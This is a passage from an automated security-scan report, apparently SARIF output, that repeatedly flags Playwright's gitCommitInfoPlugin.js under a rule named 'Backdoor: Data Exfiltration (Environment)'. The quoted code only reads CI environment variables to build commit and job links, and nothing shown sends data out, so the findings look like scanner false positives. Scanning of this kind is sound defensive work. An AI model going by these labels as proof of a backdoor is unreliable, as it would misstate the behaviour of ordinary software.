                    "text": "variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => {\n  const separator = `:${(0, _utils.createGuid)().slice(0, 4)}:`",
                    "rendered": {
                      "text": "variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => {\n  const separator = `:${(0, _utils.createGuid)().slice(0, 4)}:`",
                      "markdown": "`variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => {\n  const separator = `:${(0, _utils.createGuid)().slice(0, 4)}:``"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 6,
                  "endLine": 52,
                  "endColumn": 17,
                  "snippet": {
                    "text": "learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => {\n  const separator = `:${(0, _u",
                    "rendered": {
                      "text": "learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => {\n  const separator = `:${(0, _u",
                      "markdown": "`learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => {\n  const separator = `:${(0, _u`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 195,
                  "endLine": 51,
                  "endColumn": 206,
                  "snippet": {
                    "text": "ps://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => ",
                    "rendered": {
                      "text": "ps://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => ",
                      "markdown": "`ps://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nconst gitStatusFromCLI = async gitDir => `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 155,
                  "endLine": 51,
                  "endColumn": 166,
                  "snippet": {
                    "text": "process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nc",
                    "rendered": {
                      "text": "process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nc",
                      "markdown": "`process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GITHUB_RUN_ID}`;\n  return out;\n};\nc`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 122,
                  "endLine": 51,
                  "endColumn": 133,
                  "snippet": {
                    "text": "env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GI",
                    "rendered": {
                      "text": "env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GI",
                      "markdown": "`env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/actions/runs/${process.env.GI`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 72,
                  "endLine": 51,
                  "endColumn": 83,
                  "snippet": {
                    "text": "mmit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.en",
                    "rendered": {
                      "text": "mmit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.en",
                      "markdown": "`mmit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.env.GITHUB_SERVER_URL}/${process.en`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 39,
                  "endLine": 51,
                  "endColumn": 50,
                  "snippet": {
                    "text": "{process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.en",
                    "rendered": {
                      "text": "{process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.en",
                      "markdown": "`{process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_ID) out['ci.link'] = `${process.en`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 6,
                  "endLine": 51,
                  "endColumn": 17,
                  "snippet": {
                    "text": "IT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_I",
                    "rendered": {
                      "text": "IT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_I",
                      "markdown": "`IT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env.GITHUB_REPOSITORY}/commit/${process.env.GITHUB_SHA}`;\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_RUN_I`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 47,
                  "endLine": 49,
                  "endColumn": 58,
                  "snippet": {
                    "text": "s.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env",
                    "rendered": {
                      "text": "s.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env",
                      "markdown": "`s.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${process.env.GITHUB_SERVER_URL}/${process.env`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 6,
                  "endLine": 49,
                  "endColumn": 17,
                  "snippet": {
                    "text": "ss.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${pro",
                    "rendered": {
                      "text": "ss.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${pro",
                      "markdown": "`ss.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB_SHA) out['revision.link'] = `${pro`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 128,
                  "endLine": 48,
                  "endColumn": 139,
                  "snippet": {
                    "text": "g-environment-variables\n  if (process.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB",
                    "rendered": {
                      "text": "g-environment-variables\n  if (process.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB",
                      "markdown": "`g-environment-variables\n  if (process.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.GITHUB_REPOSITORY && process.env.GITHUB`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/plugins/gitCommitInfoPlugin.js"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 89,
                  "endLine": 48,
                  "endColumn": 100,
                  "snippet": {
                    "text": ".io/doc/book/pipeline/jenkinsfile/#using-environment-variables\n  if (process.env.BUILD_URL) out['ci.link'] = process.env.BUILD_URL;\n  // GitLab: https://docs.gitlab.com/ee/ci/variables/predefined_variables.html\n  if (process.env.CI_PROJECT_URL && process.env.CI_COMMIT_SHA) out['revision.link'] = `${process.env.CI_PROJECT_URL}/-/commit/${process.env.CI_COMMIT_SHA}`;\n  if (process.env.CI_JOB_URL) out['ci.link'] = process.env.CI_JOB_URL;\n  // GitHub: https://docs.github.com/en/actions/learn-github-actions/environment-variables#default-environment-variables\n  if (process.env.GITHUB_SERVER_URL && process.env.",
                    "rendered": {
